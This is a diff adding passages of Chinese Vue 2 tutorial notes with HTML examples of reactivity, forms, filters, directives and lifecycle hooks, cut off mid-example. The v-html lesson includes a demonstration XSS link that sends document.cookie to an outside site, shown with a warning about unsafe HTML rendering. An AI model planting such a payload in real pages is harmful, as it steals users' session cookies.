@@ -1559,5 +1559,1651 @@
 </html>
 ```
 
+### 4. 列表排序
 
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>列表排序</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>人员列表</h2>
+			<input type="text" placeholder="请输入名字" v-model="keyWord">
+			<button @click="sortType = 2">年龄升序</button>
+			<button @click="sortType = 1">年龄降序</button>
+			<button @click="sortType = 0">原顺序</button>
+			<ul>
+				<li v-for="(p,index) of filPerons" :key="p.id">
+					{{p.name}}-{{p.age}}-{{p.sex}}
+					<input type="text">
+				</li>
+			</ul>
+		</div>
+
+		<script type="text/javascript">
+			Vue.config.productionTip = false
+			
+			new Vue({
+				el:'#root',
+				data:{
+					keyWord:'',
+					sortType:0, //0原顺序 1降序 2升序
+					persons:[
+						{id:'001',name:'马冬梅',age:30,sex:'女'},
+						{id:'002',name:'周冬雨',age:31,sex:'女'},
+						{id:'003',name:'周杰伦',age:18,sex:'男'},
+						{id:'004',name:'温兆伦',age:19,sex:'男'}
+					]
+				},
+				computed:{
+					filPerons(){
+						const arr = this.persons.filter((p)=>{
+							return p.name.indexOf(this.keyWord) !== -1
+						})
+						//判断一下是否需要排序
+						if(this.sortType){
+							arr.sort((p1,p2)=>{
+								return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
+							})
+						}
+						return arr
+					}
+				}
+			}) 
+
+		</script>
+</html>
+```
+
+### 5. 更新时的一个问题
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>更新时的一个问题</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>人员列表</h2>
+			<button @click="updateMei">更新马冬梅的信息</button>
+			<ul>
+				<li v-for="(p,index) of persons" :key="p.id">
+					{{p.name}}-{{p.age}}-{{p.sex}}
+				</li>
+			</ul>
+		</div>
+
+		<script type="text/javascript">
+			Vue.config.productionTip = false
+			
+			const vm = new Vue({
+				el:'#root',
+				data:{
+					persons:[
+						{id:'001',name:'马冬梅',age:30,sex:'女'},
+						{id:'002',name:'周冬雨',age:31,sex:'女'},
+						{id:'003',name:'周杰伦',age:18,sex:'男'},
+						{id:'004',name:'温兆伦',age:19,sex:'男'}
+					]
+				},
+				methods: {
+					updateMei(){
+						// this.persons[0].name = '马老师' //奏效
+						// this.persons[0].age = 50 //奏效
+						// this.persons[0].sex = '男' //奏效
+						// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
+						this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
+					}
+				}
+			}) 
+
+		</script>
+</html>
+```
+
+### 6. Vue监测数据改变的原理
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>Vue监测数据改变的原理</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>学校名称：{{name}}</h2>
+			<h2>学校地址：{{address}}</h2>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		const vm = new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+				address:'北京',
+				student:{
+					name:'tom',
+					age:{
+						rAge:40,
+						sAge:29,
+					},
+					friends:[
+						{name:'jerry',age:35}
+					]
+				}
+			}
+		})
+	</script>
+</html>
+```
+
+### 7.  模拟一个数据监测
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>Document</title>
+	</head>
+	<body>
+		<script type="text/javascript" >
+
+			let data = {
+				name:'尚硅谷',
+				address:'北京',
+			}
+
+			//创建一个监视的实例对象，用于监视data中属性的变化
+			const obs = new Observer(data)		
+			console.log(obs)	
+
+			//准备一个vm实例对象
+			let vm = {}
+			vm._data = data = obs
+
+			function Observer(obj){
+				//汇总对象中所有的属性形成一个数组
+				const keys = Object.keys(obj)
+				//遍历
+				keys.forEach((k)=>{
+					Object.defineProperty(this,k,{
+						get(){
+							return obj[k]
+						},
+						set(val){
+							console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
+							obj[k] = val
+						}
+					})
+				})
+			}
+			
+			
+
+
+		</script>
+	</body>
+</html>
+```
+
+### 8. set使用
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>Vue监测数据改变的原理</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h1>学校信息</h1>
+			<h2>学校名称：{{school.name}}</h2>
+			<h2>学校地址：{{school.address}}</h2>
+			<h2>校长是：{{school.leader}}</h2>
+			<hr/>
+			<h1>学生信息</h1>
+			<button @click="addSex">添加一个性别属性，默认值是男</button>
+			<h2>姓名：{{student.name}}</h2>
+			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
+			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
+			<h2>朋友们</h2>
+			<ul>
+				<li v-for="(f,index) in student.friends" :key="index">
+					{{f.name}}--{{f.age}}
+				</li>
+			</ul>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		const vm = new Vue({
+			el:'#root',
+			data:{
+				school:{
+					name:'尚硅谷',
+					address:'北京',
+				},
+				student:{
+					name:'tom',
+					age:{
+						rAge:40,
+						sAge:29,
+					},
+					friends:[
+						{name:'jerry',age:35},
+						{name:'tony',age:36}
+					]
+				}
+			},
+			methods: {
+				addSex(){
+					// Vue.set(this.student,'sex','男')
+					this.$set(this.student,'sex','男')
+				}
+			}
+		})
+	</script>
+</html>
+```
+
+### 9. Vue监测数据改变的原理-数组
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>Vue监测数据改变的原理_数组</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h1>学校信息</h1>
+			<h2>学校名称：{{school.name}}</h2>
+			<h2>学校地址：{{school.address}}</h2>
+			<h2>校长是：{{school.leader}}</h2>
+			<hr/>
+			<h1>学生信息</h1>
+			<button @click="addSex">添加一个性别属性，默认值是男</button>
+			<h2>姓名：{{student.name}}</h2>
+			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
+			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
+			<h2>爱好</h2>
+			<ul>
+				<li v-for="(h,index) in student.hobby" :key="index">
+					{{h}}
+				</li>
+			</ul>
+			<h2>朋友们</h2>
+			<ul>
+				<li v-for="(f,index) in student.friends" :key="index">
+					{{f.name}}--{{f.age}}
+				</li>
+			</ul>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		const vm = new Vue({
+			el:'#root',
+			data:{
+				school:{
+					name:'尚硅谷',
+					address:'北京',
+				},
+				student:{
+					name:'tom',
+					age:{
+						rAge:40,
+						sAge:29,
+					},
+					hobby:['抽烟','喝酒','烫头'],
+					friends:[
+						{name:'jerry',age:35},
+						{name:'tony',age:36}
+					]
+				}
+			},
+			methods: {
+				addSex(){
+					// Vue.set(this.student,'sex','男')
+					this.$set(this.student,'sex','男')
+				}
+			}
+		})
+	</script>
+</html>
+```
+
+### 10 . 总结数据监视
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>总结数据监视</title>
+		<style>
+			button{
+				margin-top: 10px;
+			}
+		</style>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!--
+			Vue监视数据的原理：
+				1. vue会监视data中所有层次的数据。
+
+				2. 如何监测对象中的数据？
+								通过setter实现监视，且要在new Vue时就传入要监测的数据。
+									(1).对象中后追加的属性，Vue默认不做响应式处理
+									(2).如需给后添加的属性做响应式，请使用如下API：
+													Vue.set(target，propertyName/index，value) 或 
+													vm.$set(target，propertyName/index，value)
+
+				3. 如何监测数组中的数据？
+									通过包裹数组更新元素的方法实现，本质就是做了两件事：
+										(1).调用原生对应的方法对数组进行更新。
+										(2).重新解析模板，进而更新页面。
+
+				4.在Vue修改数组中的某个元素一定要用如下方法：
+							1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
+							2.Vue.set() 或 vm.$set()
+				
+				特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h1>学生信息</h1>
+			<button @click="student.age++">年龄+1岁</button> <br/>
+			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
+			<button @click="student.sex = '未知' ">修改性别</button> <br/>
+			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
+			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
+			<button @click="addHobby">添加一个爱好</button> <br/>
+			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
+			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
+			<h3>姓名：{{student.name}}</h3>
+			<h3>年龄：{{student.age}}</h3>
+			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
+			<h3>爱好：</h3>
+			<ul>
+				<li v-for="(h,index) in student.hobby" :key="index">
+					{{h}}
+				</li>
+			</ul>
+			<h3>朋友们：</h3>
+			<ul>
+				<li v-for="(f,index) in student.friends" :key="index">
+					{{f.name}}--{{f.age}}
+				</li>
+			</ul>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		const vm = new Vue({
+			el:'#root',
+			data:{
+				student:{
+					name:'tom',
+					age:18,
+					hobby:['抽烟','喝酒','烫头'],
+					friends:[
+						{name:'jerry',age:35},
+						{name:'tony',age:36}
+					]
+				}
+			},
+			methods: {
+				addSex(){
+					// Vue.set(this.student,'sex','男')
+					this.$set(this.student,'sex','男')
+				},
+				addFriend(){
+					this.student.friends.unshift({name:'jack',age:70})
+				},
+				updateFirstFriendName(){
+					this.student.friends[0].name = '张三'
+				},
+				addHobby(){
+					this.student.hobby.push('学习')
+				},
+				updateHobby(){
+					// this.student.hobby.splice(0,1,'开车')
+					// Vue.set(this.student.hobby,0,'开车')
+					this.$set(this.student.hobby,0,'开车')
+				},
+				removeSmoke(){
+					this.student.hobby = this.student.hobby.filter((h)=>{
+						return h !== '抽烟'
+					})
+				}
+			}
+		})
+	</script>
+</html>
+```
+
+## 收集表单数据
+
+````html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>收集表单数据</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+			收集表单数据：
+					若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
+					若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
+					若：<input type="checkbox"/>
+							1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+							2.配置input的value属性:
+									(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+									(2)v-model的初始值是数组，那么收集的的就是value组成的数组
+					备注：v-model的三个修饰符：
+									lazy：失去焦点再收集数据
+									number：输入字符串转为有效的数字
+									trim：输入首尾空格过滤
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<form @submit.prevent="demo">
+				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
+				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
+				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
+				性别：
+				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
+				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
+				爱好：
+				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
+				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
+				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
+				<br/><br/>
+				所属校区
+				<select v-model="userInfo.city">
+					<option value="">请选择校区</option>
+					<option value="beijing">北京</option>
+					<option value="shanghai">上海</option>
+					<option value="shenzhen">深圳</option>
+					<option value="wuhan">武汉</option>
+				</select>
+				<br/><br/>
+				其他信息：
+				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
+				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
+				<button>提交</button>
+			</form>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false
+
+		new Vue({
+			el:'#root',
+			data:{
+				userInfo:{
+					account:'',
+					password:'',
+					age:18,
+					sex:'female',
+					hobby:[],
+					city:'beijing',
+					other:'',
+					agree:''
+				}
+			},
+			methods: {
+				demo(){
+					console.log(JSON.stringify(this.userInfo))
+				}
+			}
+		})
+	</script>
+</html>
+````
+
+## 过滤器
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>过滤器</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+		<script type="text/javascript" src="../js/dayjs.min.js"></script>
+	</head>
+	<body>
+		<!-- 
+			过滤器：
+				定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
+				语法：
+						1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
+						2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
+				备注：
+						1.过滤器也可以接收额外参数、多个过滤器也可以串联
+						2.并没有改变原本的数据, 是产生新的对应的数据
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>显示格式化后的时间</h2>
+			<!-- 计算属性实现 -->
+			<h3>现在是：{{fmtTime}}</h3>
+			<!-- methods实现 -->
+			<h3>现在是：{{getFmtTime()}}</h3>
+			<!-- 过滤器实现 -->
+			<h3>现在是：{{time | timeFormater}}</h3>
+			<!-- 过滤器实现（传参） -->
+			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
+			<h3 :x="msg | mySlice">尚硅谷</h3>
+		</div>
+
+		<div id="root2">
+			<h2>{{msg | mySlice}}</h2>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false
+		//全局过滤器
+		Vue.filter('mySlice',function(value){
+			return value.slice(0,4)
+		})
+		
+		new Vue({
+			el:'#root',
+			data:{
+				time:1621561377603, //时间戳
+				msg:'你好，尚硅谷'
+			},
+			computed: {
+				fmtTime(){
+					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
+				}
+			},
+			methods: {
+				getFmtTime(){
+					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
+				}
+			},
+			//局部过滤器
+			filters:{
+				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
+					// console.log('@',value)
+					return dayjs(value).format(str)
+				}
+			}
+		})
+
+		new Vue({
+			el:'#root2',
+			data:{
+				msg:'hello,atguigu!'
+			}
+		})
+	</script>
+</html>
+```
+
+## 内置指令
+
+### 1. v-text指令
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-text指令</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+				我们学过的指令：
+						v-bind	: 单向绑定解析表达式, 可简写为 :xxx
+						v-model	: 双向数据绑定
+						v-for  	: 遍历数组/对象/字符串
+						v-on   	: 绑定事件监听, 可简写为@
+						v-if 	 	: 条件渲染（动态控制节点是否存存在）
+						v-else 	: 条件渲染（动态控制节点是否存存在）
+						v-show 	: 条件渲染 (动态控制节点是否展示)
+				v-text指令：
+						1.作用：向其所在的节点中渲染文本内容。
+						2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<div>你好，{{name}}</div>
+			<div v-text="name"></div>
+			<div v-text="str"></div>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		
+		new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+				str:'<h3>你好啊！</h3>'
+			}
+		})
+	</script>
+</html>
+```
+
+### 2. v-html指令
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-html指令</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+				v-html指令：
+						1.作用：向指定节点中渲染包含html结构的内容。
+						2.与插值语法的区别：
+									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
+									(2).v-html可以识别html结构。
+						3.严重注意：v-html有安全性问题！！！！
+									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<div>你好，{{name}}</div>
+			<div v-html="str"></div>
+			<div v-html="str2"></div>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+				str:'<h3>你好啊！</h3>',
+				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+			}
+		})
+	</script>
+</html>
+```
+
+### 3. v-cloak指令
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-cloak指令</title>
+		<style>
+			[v-cloak]{
+				display:none;
+			}
+		</style>
+		<!-- 引入Vue -->
+	</head>
+	<body>
+		<!-- 
+				v-cloak指令（没有值）：
+						1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
+						2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2 v-cloak>{{name}}</h2>
+		</div>
+		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
+	</body>
+	
+	<script type="text/javascript">
+		console.log(1)
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		
+		new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷'
+			}
+		})
+	</script>
+</html>
+```
+
+### 4. v-once指令
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-once指令</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+			v-once指令：
+						1.v-once所在节点在初次动态渲染后，就视为静态内容了。
+						2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2 v-once>初始化的n值是:{{n}}</h2>
+			<h2>当前的n值是:{{n}}</h2>
+			<button @click="n++">点我n+1</button>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		
+		new Vue({
+			el:'#root',
+			data:{
+				n:1
+			}
+		})
+	</script>
+</html>
+```
+
+### 5. v-pre指令
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-pre指令</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+			v-pre指令：
+					1.跳过其所在节点的编译过程。
+					2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2 v-pre>Vue其实很简单</h2>
+			<h2 >当前的n值是:{{n}}</h2>
+			<button @click="n++">点我n+1</button>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		new Vue({
+			el:'#root',
+			data:{
+				n:1
+			}
+		})
+	</script>
+</html>
+```
+
+## 自定义指令
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>自定义指令</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+				需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
+				需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
+				自定义指令总结：
+						一、定义语法：
+									(1).局部指令：
+												new Vue({															new Vue({
+													directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
+												}) 																		})
+									(2).全局指令：
+													Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
+
+						二、配置对象中常用的3个回调：
+									(1).bind：指令与元素成功绑定时调用。
+									(2).inserted：指令所在元素被插入页面时调用。
+									(3).update：指令所在模板结构被重新解析时调用。
+
+						三、备注：
+									1.指令定义时不加v-，但使用时要加v-；
+									2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>{{name}}</h2>
+			<h2>当前的n值是：<span v-text="n"></span> </h2>
+			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
+			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
+			<button @click="n++">点我n+1</button>
+			<hr/>
+			<input type="text" v-fbind:value="n">
+		</div>
+	</body>
+	
+	<script type="text/javascript">
+		Vue.config.productionTip = false
+
+		//定义全局指令
+		/* Vue.directive('fbind',{
+			//指令与元素成功绑定时（一上来）
+			bind(element,binding){
+				element.value = binding.value
+			},
+			//指令所在元素被插入页面时
+			inserted(element,binding){
+				element.focus()
+			},
+			//指令所在的模板被重新解析时
+			update(element,binding){
+				element.value = binding.value
+			}
+		}) */
+
+		new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+				n:1
+			},
+			directives:{
+				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
+				/* 'big-number'(element,binding){
+					// console.log('big')
+					element.innerText = binding.value * 10
+				}, */
+				big(element,binding){
+					console.log('big',this) //注意此处的this是window
+					// console.log('big')
+					element.innerText = binding.value * 10
+				},
+				fbind:{
+					//指令与元素成功绑定时（一上来）
+					bind(element,binding){
+						element.value = binding.value
+					},
+					//指令所在元素被插入页面时
+					inserted(element,binding){
+						element.focus()
+					},
+					//指令所在的模板被重新解析时
+					update(element,binding){
+						element.value = binding.value
+					}
+				}
+			}
+		})
+		
+	</script>
+</html>
+```
+
+### 回顾一个DOM操作
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>Document</title>
+		<style>
+			.demo{
+				background-color: orange;
+			}
+		</style>
+	</head>
+	<body>
+		<button id="btn">点我创建一个输入框</button>
+		
+		<script type="text/javascript" >
+			const btn = document.getElementById('btn')
+			btn.onclick = ()=>{
+				const input = document.createElement('input')
+
+				input.className = 'demo'
+				input.value = 99
+				input.onclick = ()=>{alert(1)}
+				
+				document.body.appendChild(input)
+
+				input.focus()
+				// input.parentElement.style.backgroundColor = 'skyblue'
+				console.log(input.parentElement)
+				
+			}
+		</script>
+	</body>
+</html>
+```
+
+## 生命周期
+
+### 1. 引出生命周期
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>引出生命周期</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+				生命周期：
+						1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
+						2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
+						3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
+						4.生命周期函数中的this指向是vm 或 组件实例对象。
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2 v-if="a">你好啊</h2>
+			<h2 :style="{opacity}">欢迎学习Vue</h2>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		
+		 new Vue({
+			el:'#root',
+			data:{
+				a:false,
+				opacity:1
+			},
+			methods: {
+				
+			},
+			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
+			mounted(){
+				console.log('mounted',this)
+				setInterval(() => {
+					this.opacity -= 0.01
+					if(this.opacity <= 0) this.opacity = 1
+				},16)
+			},
+		})
+
+		//通过外部的定时器实现（不推荐）
+		/* setInterval(() => {
+			vm.opacity -= 0.01
+			if(vm.opacity <= 0) vm.opacity = 1
+		},16) */
+	</script>
+</html>
+```
+
+### 2. 分析生命周期
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>分析生命周期</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root" :x="n">
+			<h2 v-text="n"></h2>
+			<h2>当前的n值是：{{n}}</h2>
+			<button @click="add">点我n+1</button>
+			<button @click="bye">点我销毁vm</button>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		new Vue({
+			el:'#root',
+			// template:`
+			// 	<div>
+			// 		<h2>当前的n值是：{{n}}</h2>
+			// 		<button @click="add">点我n+1</button>
+			// 	</div>
+			// `,
+			data:{
+				n:1
+			},
+			methods: {
+				add(){
+					console.log('add')
+					this.n++
+				},
+				bye(){
+					console.log('bye')
+					this.$destroy()
+				}
+			},
+			watch:{
+				n(){
+					console.log('n变了')
+				}
+			},
+			beforeCreate() {
+				console.log('beforeCreate')
+			},
+			created() {
+				console.log('created')
+			},
+			beforeMount() {
+				console.log('beforeMount')
+			},
+			mounted() {
+				console.log('mounted')
+			},
+			beforeUpdate() {
+				console.log('beforeUpdate')
+			},
+			updated() {
+				console.log('updated')
+			},
+			beforeDestroy() {
+				console.log('beforeDestroy')
+			},
+			destroyed() {
+				console.log('destroyed')
+			},
+		})
+	</script>
+</html>
+```
+
+### 3. 总结生命周期
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>引出生命周期</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+				常用的生命周期钩子：
+						1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
+						2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
+
+				关于销毁Vue实例
+						1.销毁后借助Vue开发者工具看不到任何信息。
+						2.销毁后自定义事件会失效，但原生DOM事件依然有效。
+						3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2 :style="{opacity}">欢迎学习Vue</h2>
+			<button @click="opacity = 1">透明度设置为1</button>
+			<button @click="stop">点我停止变换</button>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		 new Vue({
+			el:'#root',
+			data:{
+				opacity:1
+			},
+			methods: {
+				stop(){
+					this.$destroy()
+				}
+			},
+			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
+			mounted(){
+				console.log('mounted',this)
+				this.timer = setInterval(() => {
+					console.log('setInterval')
+					this.opacity -= 0.01
+					if(this.opacity <= 0) this.opacity = 1
+				},16)
+			},
+			beforeDestroy() {
+				clearInterval(this.timer)
+				console.log('vm即将驾鹤西游了')
+			},
+		})
+
+	</script>
+</html>
+```
+
+## 非单文件组件
+
+### 1. 基本使用
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>基本使用</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+			Vue中使用组件的三大步骤：
+					一、定义组件(创建组件)
+					二、注册组件
+					三、使用组件(写组件标签)
+
+			一、如何定义一个组件？
+						使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
+						区别如下：
+								1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
+								2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
+						备注：使用template可以配置组件结构。
+
+			二、如何注册组件？
+							1.局部注册：靠new Vue的时候传入components选项
+							2.全局注册：靠Vue.component('组件名',组件)
+
+			三、编写组件标签：
+							<school></school>
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<hello></hello>
+			<hr>
+			<h1>{{msg}}</h1>
+			<hr>
+			<!-- 第三步：编写组件标签 -->
+			<school></school>
+			<hr>
+			<!-- 第三步：编写组件标签 -->
+			<student></student>
+		</div>
+
+		<div id="root2">
+			<hello></hello>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false
+
+		//第一步：创建school组件
+		const school = Vue.extend({
+			template:`
+				<div class="demo">
+					<h2>学校名称：{{schoolName}}</h2>
+					<h2>学校地址：{{address}}</h2>
+					<button @click="showName">点我提示学校名</button>	
